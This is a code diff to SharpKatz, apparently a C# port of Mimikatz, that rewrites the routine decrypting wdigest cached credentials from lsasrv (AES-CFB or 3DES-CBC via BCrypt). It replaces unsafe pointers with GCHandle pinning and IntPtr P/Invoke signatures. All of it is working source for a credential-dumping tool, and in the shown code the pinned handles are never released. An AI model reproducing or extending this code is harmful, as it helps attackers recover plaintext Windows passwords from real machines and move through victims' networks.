@@ -43,7 +43,7 @@ namespace SharpKatz.Crypto
     class BCrypt
     {
         // Decrypt wdigest cached credentials using AES or 3Des 
-        public static unsafe byte[] DecryptCredentials(byte[] encrypedPass, byte[] IV, byte[] aeskey, byte[] deskey)
+        public static  byte[] DecryptCredentials(byte[] encrypedPass, byte[] IV, byte[] aeskey, byte[] deskey)
         {
             SafeBCryptAlgorithmHandle hProvider, hDesProvider;
             SafeBCryptKeyHandle hAes, hDes;
@@ -62,36 +62,50 @@ namespace SharpKatz.Crypto
                 // If suited to AES, lsasrv uses AES in CFB mode
                 Natives.BCryptOpenAlgorithmProvider(out hProvider, Natives.BCRYPT_AES_ALGORITHM, null, 0);
                 Natives.BCryptSetProperty(hProvider, Natives.BCRYPT_CHAINING_MODE, Natives.BCRYPT_CHAIN_MODE_CFB, Natives.BCRYPT_CHAIN_MODE_CFB.Length, 0);
-                fixed (byte* pkey = aeskey)
-                fixed (byte* pencrypedPass = encrypedPass)
-                fixed (byte* pinitializationVector = initializationVector)
-                fixed (byte* ppassDecrypted = passDecrypted)
+
+                GCHandle pkeypinnedArray = GCHandle.Alloc(aeskey, GCHandleType.Pinned);
+                IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();
+
+                GCHandle pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
+                IntPtr pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();
+
+                GCHandle pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
+                IntPtr pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();
+
+                GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
+                IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();
+
+                Natives.BCryptGenerateSymmetricKey(hProvider, out hAes, IntPtr.Zero, 0, pkey, aeskey.Length, 0);
+                status = Natives.BCryptDecrypt(hAes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, IV.Length, ppassDecrypted, passDecrypted.Length, out result, 0);
+                if (status != 0)
                 {
-                    Natives.BCryptGenerateSymmetricKey(hProvider, out hAes, null, 0, pkey, aeskey.Length, 0);
-                    status = Natives.BCryptDecrypt(hAes, pencrypedPass, encrypedPass.Length, (void*)0, pinitializationVector, IV.Length, ppassDecrypted, passDecrypted.Length, out result, 0);
-                    if (status != 0)
-                    {
-                        return null;
-                    }
+                    return null;
                 }
+
             }
             else
             {
                 // If suited to 3DES, lsasrv uses 3DES in CBC mode
                 Natives.BCryptOpenAlgorithmProvider(out hDesProvider, Natives.BCRYPT_3DES_ALGORITHM, null, 0);
                 Natives.BCryptSetProperty(hDesProvider, Natives.BCRYPT_CHAINING_MODE, Natives.BCRYPT_CHAIN_MODE_CBC, Natives.BCRYPT_CHAIN_MODE_CBC.Length, 0);
-                
-                fixed (byte* pkey = deskey)
-                fixed (byte* pencrypedPass = encrypedPass)
-                fixed (byte* pinitializationVector = initializationVector)
-                fixed (byte* ppassDecrypted = passDecrypted)
+
+                GCHandle pkeypinnedArray = GCHandle.Alloc(deskey, GCHandleType.Pinned);
+                IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();
+
+                GCHandle pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
+                IntPtr pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();
+
+                GCHandle pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
+                IntPtr pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();
+
+                GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
+                IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();
+
+                Natives.BCryptGenerateSymmetricKey(hDesProvider, out hDes, IntPtr.Zero, 0, pkey, deskey.Length, 0);
+                status = Natives.BCryptDecrypt(hDes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, 8, ppassDecrypted, passDecrypted.Length, out result, 0);
+                if (status != 0)
                 {
-                    Natives.BCryptGenerateSymmetricKey(hDesProvider, out hDes, null, 0, pkey, deskey.Length, 0);
-                    status = Natives.BCryptDecrypt(hDes, pencrypedPass, encrypedPass.Length, (void *)0, pinitializationVector, 8, ppassDecrypted, passDecrypted.Length, out result, 0);
-                    if (status != 0)
-                    {
-                        return null;
-                    }
+                    return null;
                 }
                 
             }
@@ -135,24 +149,24 @@ namespace SharpKatz.Crypto
                 int dwFlags);
 
         [DllImport("bcrypt.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern unsafe NTSTATUS BCryptGenerateSymmetricKey(
+        public static extern  NTSTATUS BCryptGenerateSymmetricKey(
             SafeBCryptAlgorithmHandle hAlgorithm,
             out SafeBCryptKeyHandle phKey,
-            byte* pbKeyObject,
+            IntPtr pbKeyObject,
             int cbKeyObject,
-            byte* pbSecret,
+            IntPtr pbSecret,
             int cbSecret,
             int flags);
 
         [DllImport("bcrypt.dll", SetLastError = true)]
-        public static unsafe extern NTSTATUS BCryptDecrypt(
+        public static  extern NTSTATUS BCryptDecrypt(
             SafeBCryptKeyHandle hKey,
-            byte* pbInput,
+            IntPtr pbInput,
             int cbInput,
-            void* pPaddingInfo,
-            byte* pbIV,
+            IntPtr pPaddingInfo,
+            IntPtr pbIV,
             int cbIV,
-            byte* pbOutput,
+            IntPtr pbOutput,
             int cbOutput,
             out int pcbResult,
             int dwFlags);
